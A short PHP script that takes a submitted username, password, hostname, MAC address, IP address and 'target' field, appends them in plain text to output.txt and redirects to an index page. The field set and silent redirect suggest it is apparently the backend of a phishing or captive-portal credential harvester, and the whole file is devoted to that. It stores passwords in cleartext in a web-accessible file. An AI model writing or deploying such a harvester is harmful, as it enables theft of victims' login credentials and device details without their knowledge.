<?php
// Check if the form data has been submitted via POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Sanitize and retrieve the POST data
    $uname = htmlspecialchars($_POST['uname'] ?? '', ENT_QUOTES);
    $pass = htmlspecialchars($_POST['pass'] ?? '', ENT_QUOTES);
    $hostname = htmlspecialchars($_POST['hostname'] ?? '', ENT_QUOTES);
    $mac = htmlspecialchars($_POST['mac'] ?? '', ENT_QUOTES);
    $ip = htmlspecialchars($_POST['ip'] ?? '', ENT_QUOTES);
    $target = htmlspecialchars($_POST['target'] ?? '', ENT_QUOTES);

    // Create a string with the collected data
    $output = "Username: $uname\n";
    $output .= "Password: $pass\n";
    $output .= "Hostname: $hostname\n";
    $output .= "MAC Address: $mac\n";
    $output .= "IP Address: $ip\n";
    $output .= "Target: $target\n";
    $output .= "-----------------------\n";

    // Define the file where data will be saved
    $file = 'output.txt';

    // Save the data to the file (append mode)
    if (file_put_contents($file, $output, FILE_APPEND | LOCK_EX)) {
        echo "Data successfully saved to $file.";
    } else {
        echo "Error saving data.";
    }
} else {
    echo "No data received.";
}

// Redirect back to ./index.php
header('Location: ../index.php');
exit;
?>
